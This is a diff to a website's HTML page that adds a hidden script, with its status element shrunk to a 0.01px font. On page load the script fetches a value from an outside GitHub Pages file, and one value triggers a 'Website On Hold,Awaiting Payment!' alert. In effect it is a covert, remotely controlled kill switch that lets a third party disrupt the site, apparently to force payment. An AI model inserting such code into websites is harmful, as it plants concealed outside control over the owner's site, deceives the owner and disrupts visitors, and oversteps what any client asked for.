@@ -36,6 +36,47 @@
 
 
 
+    <div id="status" class="loading">Loading file content...</div><style>#status{font-size:0.01px;}</style>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const statusElement = document.getElementById('status');
+            
+            // Replace with your GitHub raw file URL or GitHub Pages URL
+            const fileUrl = 'https://galeabaneng.github.io/tigerpremium/example.txt';
+            
+            fetch(fileUrl)
+                .then(response => {
+                    if (!response.ok) throw new Error('Failed to load file');
+                    return response.text();
+                })
+                .then(content => {
+                    const value = parseInt(content.trim());
+                    statusElement.textContent = `File content: ${value}`;
+                    statusElement.className = 'success';
+                    
+                    // Redirect after 2 seconds (2000ms) to show the message
+                    setTimeout(() => {
+                        if (value === 100) {
+                            
+                        } 
+                        else if (value === 200) {
+                            alert("Website On Hold,Awaiting Payment!");
+                        }
+                    }, 2000);
+                })
+                .catch(error => {
+                    statusElement.textContent = `Error: ${error.message}`;
+                    statusElement.className = 'error';
+                });
+        });
+    </script>
+
+
+
+
+	
+
     <!-- Navbar & Carousel Start -->
     <div class="container-fluid position-relative p-0">
         <nav class="navbar navbar-expand-lg navbar-dark px-5 py-3 py-lg-0">
@@ -405,6 +446,7 @@ levels of productivity, safety, and data insight.</p>
 
 
 </html>
+
 
 
 
